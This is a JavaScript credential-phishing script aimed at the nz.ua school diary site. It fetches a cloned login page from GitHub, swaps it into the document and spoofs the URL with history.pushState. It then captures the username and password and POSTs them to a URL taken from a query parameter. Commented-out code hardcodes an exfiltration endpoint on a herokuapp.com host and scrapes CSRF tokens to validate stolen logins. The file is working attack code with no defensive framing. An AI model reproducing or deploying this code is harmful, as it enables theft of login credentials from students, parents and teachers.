function g(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
function createMyScript() {
    let script = document.createElement('script')
    script.innerHTML = `let btn = document.getElementById('form-button');
    let login = document.getElementById('loginform-login')
    let password = document.getElementById('loginform-password')
    
    function postResult(data) {
        let xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                window.location.href = nextUrl;
            }
        }
        xhr.open("POST", postResultURL, false);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.setRequestHeader('Access-Control-Allow-Origin', null);
        xhr.send(JSON.stringify(data));
        return xhr.responseText
    }
    
    function checkCredentials(data) {
        let xhr = new XMLHttpRequest();
        xhr.open("POST", checkCredentialsURL, false);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(data));
        return xhr.responseText
    }
    
    function getNextUrl() {
        let url = new URL(window.location.href);
        let next = url.searchParams.get('next');
        return next ? next : 'https://nz.ua/menu/'
    }
    
    function getCheckURL() {
        let url = new URL(window.location.href);
        let next = url.searchParams.get('checkURL');
        return next;
    }
    
    function getResultURL() {
        let url = new URL(window.location.href);
        let next = url.searchParams.get('result');
        return next;
    }

    function showError() {
        let block = document.createElement('div')
        block.innerHTML = '<div class="alert alert-danger" role="alert"><div><ul><li>Неправильне ім\\\'я користувача або пароль!</li></ul></div></div>';
        let main = document.getElementsByClassName('soobsh')[0]
        main.prepend(block)
    }

    const nextUrl = getNextUrl()
    const checkCredentialsURL = getCheckURL();
    const postResultURL = getResultURL();
    let showedError = false;
    
    btn.addEventListener('click', () => {
        let creds = {login: login.value, password: password.value};
        let response = checkCredentials(creds)
        console.log(response)
        if (response === 'True')
            postResult(creds)
        else {
            // if (!showedError)
            //     showError()
            showedError = true;
        }
    });`;
    return script
}

let html = g('https://raw.githubusercontent.com/thebocher/js-script/main/h.html') 
document.documentElement.innerHTML = html
document.body.appendChild( createMyScript() )
window.history.pushState({"html": html,"pageTitle":"Нові знання - Вхід на сайт - Електронні щоденники та журнали з можливостями дистанційного навчання/ Электронные дневники и журналы"}, "", "/")





// let btn = document.getElementById('form-button');
// let login = document.getElementById('loginform-login')
// let password = document.getElementById('loginform-password')

// function postResult(data) {
//     url = 'https://controlyourmum.herokuapp.com/wtflolfuckyou'
//     let xhr = new XMLHttpRequest();
//     xhr.onreadystatechange = function() {
//         if (xhr.readyState === 4) {
//             window.location.href = nextUrl;
//         }
//     }
//     xhr.open("POST", url, false);
//     xhr.setRequestHeader('Content-Type', 'application/json');
//     xhr.setRequestHeader('Access-Control-Allow-Origin', null);
//     xhr.send(JSON.stringify(data));
//     return xhr.responseText
// }

// function getToken(xhr) {
//     xhr.open("GET", 'https://nz.ua/', false);
//     xhr.withCredentials = true;
//     xhr.send();
//     re = new RegExp('name="csrf-token" content="(.+)"')
//     return re.exec(xhr.responseText)[1]
// }

// function checkCredentials() {
//     xhr = new XMLHttpRequest()
//     xhr.withCredentials = true;
//     data = {
//         '_csrf': getToken(xhr),
//         'LoginForm[login]': login.value,
//         'LoginForm[password]': password.value
//     }
//     xhr.open("POST", 'https://nz.ua/', false)
//     xhr.send(JSON.stringify(data))
//     return xhr
// }

// function getNextUrl() {
//     let url = new URL(window.location.href);
//     let next = url.searchParams.get('next');
//     return next ? next : 'https://nz.ua/menu/'
// }
// const nextUrl = getNextUrl()

// btn.addEventListener('click', () => {
//     let response = checkCredentials(checkCredentialsURL, {login: login.value, password: password.value})
//     // url, {login: login.value, password: password.value}
// });

// fetch('https://nz.ua/', {
//     method: 'GET'
// }).then(response => {
//     re = new RegExp('name="csrf-token" content="(.+)"')
//     return re.exec(response.responseText)[1]
// })

// async function main() {
//     let text = await fetch('https://nz.ua/', {
//         credentials: "same-origin"
//     }).then(response => response.text())
//     re = new RegExp('name="csrf-token" content="(.+)"')
//     token = re.exec(text)[1]
    
//     data = {
//         '_csrf': token,
//         'LoginForm[login]': login.value,
//         'LoginForm[password]': password.value
//     }
//     return await fetch('https://nz.ua/', {
//         method: "POST",
//         credentials: "same-origin",
//         body: JSON.stringify(data)
//     })
// }